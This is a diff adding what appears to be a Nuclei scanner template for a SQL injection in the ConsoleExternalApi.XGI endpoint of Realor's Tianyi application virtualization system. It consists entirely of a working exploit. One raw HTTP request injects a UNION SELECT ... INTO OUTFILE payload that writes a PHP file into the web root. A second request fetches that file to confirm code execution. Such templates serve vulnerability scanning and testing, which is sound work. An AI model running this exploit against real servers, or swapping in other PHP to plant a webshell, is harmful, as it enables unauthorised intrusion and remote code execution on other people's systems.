@@ -1,0 +1,44 @@
+id: realor-consoleexternalapi-sqli
+
+info:
+  name: Realor ConsoleExternalApi.XGI - SQL Injection
+  author: qwtd
+  severity: critical
+  description: |
+    瑞友天翼应用虚拟化系统 ConsoleExternalApi.XGI 接口存在SQL注入漏洞
+  tags: REALOR-天翼应用虚拟化系统
+
+variables:
+  filename: '{{rand_base(6)}}'
+
+http:
+  - raw:
+      - |
+        POST /ConsoleExternalApi.XGI?initParams=command_createUser__pwd_1&key=inner&sign=9252fae35ff226ec26c4d1d9566ebbde HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip
+        Connection: close
+        Content-Length: 588
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+
+        {
+          "account": "1' union select '<?php echo(md5(\"123456\"));unlink(__FILE__);?>',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL into outfile '..\\\\..\\\\WebRoot\\\\{{filename}}.xgi'#",
+          "userPwd": "1"
+        }
+
+      - |
+        GET /{{filename}}.xgi HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Accept-Encoding: gzip
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "e10adc3949ba59abbe56e057f20f883e"
+        part: body
